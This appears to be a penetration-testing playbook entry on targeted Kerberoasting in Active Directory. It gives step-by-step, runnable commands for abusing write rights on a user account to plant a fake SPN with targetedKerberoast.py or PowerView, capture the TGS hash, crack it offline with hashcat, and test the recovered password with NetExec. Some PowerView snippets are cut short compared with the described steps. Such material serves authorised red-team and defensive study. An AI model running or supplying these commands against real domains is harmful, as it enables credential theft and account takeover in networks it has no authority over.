# 10.11 Targeted Kerberoasting WriteProperty on SPN

> Stamp a fake SPN on a user via WriteProperty/GenericWrite with `targetedKerberoast.py`, roast the TGS, then unset the SPN.

## Overview

If a controlled account has GenericAll, GenericWrite, WriteProperty, WriteSPN, or Validated-SPN over a user, that user can be made Kerberoastable by temporarily setting a fake SPN on their account. targetedKerberoast.py automates the SPN add/request/remove cycle from Linux; PowerView's Set-DomainObject/Get-DomainSPNTicket handles it from Windows. Crack the resulting TGS hash with hashcat mode 13100.

## Steps

- Use dacledit.py -principal pedro -target Rita to confirm WriteProperty/Validated-SPN ACE.
- From Windows, use PowerView Get-DomainObjectAcl -Identity rita filtered by pedro's SID to confirm.
- Clone targetedKerberoast and install requirements (pip install -r requirements.txt).
- Run targetedKerberoast.py --request-user rita to set SPN, request TGS, then auto-remove SPN.
- From Windows: Set-DomainObject to set SPN, Get-DomainSPNTicket to capture hash, Set-DomainObject -Clear to remove SPN.
- Crack the hash with hashcat -m 13100 against rockyou.txt.
- Validate cracked credentials with NetExec.

## Commands

### Enumerate rights with dacledit.py

```bash
python3 examples/dacledit.py -principal pedro -target Rita -dc-ip <TARGET> <DOMAIN>.local/pedro:SecuringAD01
```

### Enumerate rights with PowerView

```powershell
$userSID = (Get-DomainUser -Identity pedro).objectsid
```

### Clone and install targetedKerberoast

```bash
git clone https://github.com/ShutdownRepo/targetedKerberoast
```

### Run targeted Kerberoast from Linux

```bash
python3 targetedKerberoast.py -vv -d <DOMAIN>.local -u pedro -p SecuringAD01 --request-user rita --dc-ip <TARGET>
```

### Set SPN from Windows (PowerView)

```powershell
Set-DomainObject -Identity rita -Set @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose
```

### Get TGS hash from Windows (PowerView)

```powershell
$User = Get-DomainUser Rita
```

### Clear SPN from Windows (PowerView)

```powershell
Set-DomainObject -Identity Rita -Clear serviceprincipalname -Verbose
```

### Crack TGS hash with hashcat

```bash
hashcat -m 13100 /tmp/rita.hash /usr/share/wordlists/rockyou.txt --force
```

### Validate cracked password

```bash
poetry run nxc smb <TARGET> -u rita -p Password123
```
